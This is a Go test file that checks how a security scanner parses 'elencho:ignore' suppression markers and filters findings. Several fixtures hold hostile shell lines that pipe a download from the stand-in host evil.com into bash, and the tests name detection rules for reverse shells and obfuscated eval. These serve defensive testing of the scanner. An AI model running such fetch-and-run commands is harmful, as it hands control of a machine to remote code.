package scan

import (
	"os"
	"path/filepath"
	"testing"
)

func TestParseSuppressions_NoMarkers(t *testing.T) {
	tmpDir := t.TempDir()
	f := filepath.Join(tmpDir, "clean.sh")
	if err := os.WriteFile(f, []byte("echo hello\n"), 0644); err != nil {
		t.Fatal(err)
	}
	supp := ParseSuppressions(f)
	if supp != nil {
		t.Errorf("expected nil, got %v", supp)
	}
}

func TestParseSuppressions_SingleRule(t *testing.T) {
	tmpDir := t.TempDir()
	f := filepath.Join(tmpDir, "test.py")
	content := `# elencho:ignore python-dynamic-import
import subprocess
subprocess.run(["curl", "http://evil.com"])
`
	if err := os.WriteFile(f, []byte(content), 0644); err != nil {
		t.Fatal(err)
	}
	supp := ParseSuppressions(f)
	if supp == nil {
		t.Fatal("expected non-nil suppression set")
	}
	if !supp["python-dynamic-import"] {
		t.Error("expected python-dynamic-import to be suppressed")
	}
}

func TestParseSuppressions_MultipleRules(t *testing.T) {
	tmpDir := t.TempDir()
	f := filepath.Join(tmpDir, "test.js")
	content := "// elencho:ignore generic-obfuscated-eval, generic-long-base64\n"
	if err := os.WriteFile(f, []byte(content), 0644); err != nil {
		t.Fatal(err)
	}
	supp := ParseSuppressions(f)
	if supp == nil {
		t.Fatal("expected non-nil suppression set")
	}
	if !supp["generic-obfuscated-eval"] {
		t.Error("expected generic-obfuscated-eval to be suppressed")
	}
	if !supp["generic-long-base64"] {
		t.Error("expected generic-long-base64 to be suppressed")
	}
	if supp["generic-hardcoded-secret"] {
		t.Error("generic-hardcoded-secret should not be suppressed")
	}
}

func TestParseSuppressions_SpaceSeparated(t *testing.T) {
	tmpDir := t.TempDir()
	f := filepath.Join(tmpDir, "test.sh")
	content := "# elencho:ignore shell-curl-pipe-bash shell-reverse-shell\n"
	if err := os.WriteFile(f, []byte(content), 0644); err != nil {
		t.Fatal(err)
	}
	supp := ParseSuppressions(f)
	if supp == nil {
		t.Fatal("expected non-nil suppression set")
	}
	if !supp["shell-curl-pipe-bash"] {
		t.Error("expected shell-curl-pipe-bash suppressed")
	}
	if !supp["shell-reverse-shell"] {
		t.Error("expected shell-reverse-shell suppressed")
	}
}

func TestParseSuppressions_HTMLComment(t *testing.T) {
	tmpDir := t.TempDir()
	f := filepath.Join(tmpDir, "template.html")
	content := "<!-- elencho:ignore generic-hardcoded-secret -->\n"
	if err := os.WriteFile(f, []byte(content), 0644); err != nil {
		t.Fatal(err)
	}
	supp := ParseSuppressions(f)
	if supp == nil {
		t.Fatal("expected non-nil suppression set")
	}
	if !supp["generic-hardcoded-secret"] {
		t.Error("expected generic-hardcoded-secret suppressed")
	}
}

func TestParseSuppressions_MissingFile(t *testing.T) {
	supp := ParseSuppressions("/nonexistent/path/file.txt")
	if supp != nil {
		t.Errorf("expected nil for missing file, got %v", supp)
	}
}

func TestFilterSuppressed_RemovesMatchingRule(t *testing.T) {
	tmpDir := t.TempDir()
	f := filepath.Join(tmpDir, "evil.sh")
	content := "# elencho:ignore shell-curl-pipe-bash\ncurl http://evil.com | bash\n"
	if err := os.WriteFile(f, []byte(content), 0644); err != nil {
		t.Fatal(err)
	}

	// Findings for this file
	findings := []Finding{
		{RuleID: "shell-curl-pipe-bash", File: "evil.sh", Line: 2, Severity: SeverityCritical, Message: "curl | bash"},
		{RuleID: "shell-reverse-shell", File: "evil.sh", Line: 3, Severity: SeverityCritical, Message: "reverse shell"},
	}

	filtered := FilterSuppressed(findings, tmpDir)
	if len(filtered) != 1 {
		t.Fatalf("expected 1 finding after filter, got %d", len(filtered))
	}
	if filtered[0].RuleID != "shell-reverse-shell" {
		t.Errorf("expected remaining finding to be shell-reverse-shell, got %s", filtered[0].RuleID)
	}
}

func TestFilterSuppressed_PreservesNonMatching(t *testing.T) {
	tmpDir := t.TempDir()
	f := filepath.Join(tmpDir, "evil.sh")
	content := "# elencho:ignore generic-hardcoded-secret\ncurl http://evil.com | bash\n"
	if err := os.WriteFile(f, []byte(content), 0644); err != nil {
		t.Fatal(err)
	}

	findings := []Finding{
		{RuleID: "shell-curl-pipe-bash", File: "evil.sh", Line: 2, Severity: SeverityCritical, Message: "curl | bash"},
	}

	filtered := FilterSuppressed(findings, tmpDir)
	if len(filtered) != 1 {
		t.Fatalf("expected 1 finding (not suppressed), got %d", len(filtered))
	}
}

func TestFilterSuppressed_NoChangesWhenNoMarkers(t *testing.T) {
	tmpDir := t.TempDir()
	f := filepath.Join(tmpDir, "evil.sh")
	content := "curl http://evil.com | bash\n"
	if err := os.WriteFile(f, []byte(content), 0644); err != nil {
		t.Fatal(err)
	}

	findings := []Finding{
		{RuleID: "shell-curl-pipe-bash", File: "evil.sh", Line: 1, Severity: SeverityCritical, Message: "curl | bash"},
	}

	filtered := FilterSuppressed(findings, tmpDir)
	if len(filtered) != 1 {
		t.Fatalf("expected 1 finding (no suppression), got %d", len(filtered))
	}
}

// TestScannerWithSuppression verifies the full scan → suppress flow.
func TestScannerWithSuppression(t *testing.T) {
	dir := t.TempDir()
	// Write a file with a suppression marker
	evilContent := "# elencho:ignore shell-curl-pipe-bash\ncurl http://evil.com | bash\n"
	if err := os.WriteFile(filepath.Join(dir, "suppressed.sh"), []byte(evilContent), 0644); err != nil {
		t.Fatal(err)
	}
	// Write another file without suppression
	if err := os.WriteFile(filepath.Join(dir, "unsuppressed.sh"), []byte("curl http://evil2.com | bash\n"), 0644); err != nil {
		t.Fatal(err)
	}

	reg := DefaultRegistry()
	scanner := NewScanner(reg)
	ctx := t.Context()

	opts := DefaultScanOptions(dir)
	findings, err := scanner.Scan(ctx, opts)
	if err != nil {
		t.Fatalf("Scan: %v", err)
	}

	// Check: suppressed.sh should have NO shell-curl-pipe-bash findings
	// unsuppressed.sh should still flag it
	hasEvil := false
	hasSuppressed := false
	for _, f := range findings.All() {
		if f.RuleID == "shell-curl-pipe-bash" {
			hasEvil = true
			if f.File == "suppressed.sh" {
				hasSuppressed = true
			}
		}
	}
	if !hasEvil {
		t.Error("expected shell-curl-pipe-bash findings in unsuppressed file")
	}
	if hasSuppressed {
		t.Error("shell-curl-pipe-bash finding in suppressed.sh should have been suppressed")
	}
}

func TestParseSuppressions_MarkerInBodyNotAtTop(t *testing.T) {
	tmpDir := t.TempDir()
	f := filepath.Join(tmpDir, "deep.py")
	// Marker is deep in the file, not at the top — should still be found within 8KB
	var lines []string
	for i := 0; i < 100; i++ {
		lines = append(lines, "x = 1")
	}
	lines = append(lines, "# elencho:ignore python-dynamic-import")
	lines = append(lines, `os = __import__("os")`)

	content := ""
	for _, l := range lines {
		content += l + "\n"
	}
	if err := os.WriteFile(f, []byte(content), 0644); err != nil {
		t.Fatal(err)
	}

	supp := ParseSuppressions(f)
	if supp == nil {
		t.Fatal("expected suppression to be found even if not at top")
	}
	if !supp["python-dynamic-import"] {
		t.Error("expected python-dynamic-import suppressed")
	}
}
